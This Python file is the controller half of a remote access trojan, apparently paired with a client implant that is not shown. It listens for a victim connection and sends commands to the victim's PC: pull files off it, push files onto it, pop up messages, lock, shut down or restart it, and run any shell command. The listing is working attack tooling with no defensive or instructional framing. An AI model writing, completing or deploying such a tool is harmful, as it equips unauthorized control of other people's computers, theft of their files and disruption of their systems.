import socket, json, base64

# Set the commands as a 2D array with descriptions for modularity
commands = [
    ["exit", "Exits the connection on both sides"],
    ["cd", "Changes the active directory"],
    ["download", "Downloads files from the client"],
    ["upload", "Uploads files from the server to the client"],
    ["message", "Shows a message box on the client users screen"],
    ["lock", "Puts the client user back to the login screen"],
    ["shutdown", "Shutsdown the client users PC, will close connection"],
    ["restart", "Restarts the client users PC"],
    ["ratHelp", "Displays this list"],
]

def helpCommand():
    total = 0
    result = "\nCommands: \n"
    # Simple loop to send a description of all commands
    for x in commands:
        result = result + "\n" + f"[{total}] {commands[total][0]} - {commands[total][1]}"
        total += 1
    result = result + "\n" + "[∞] Anything - will run a command on the users PC like command prompt\n"
    return result


class Server:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Waiting for a connection")
        self.connection, address = server.accept()
        print("[+] Connection received from " + str(address))
        helpCommand()

    def dataReceive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def dataSend(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    def executeRemotely(self, command):
        self.dataSend(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.dataReceive()

    def readFile(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def writeFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete"
        
    def step(self, command):
        command = command.split(" ", 1)
        try:
            if command[0] == "upload":
                fileContent = self.readFile(command[1]).decode()
                command.append(fileContent)
            result = self.executeRemotely(command)
            if command[0] == "download" and "[-] Error" not in result:
                result = self.writeFile(command[1], result)
            elif command[0] == "ratHelp":
                result = helpCommand()
        except Exception:
            result = "[-] Error running command, check the syntax of the command."
        return result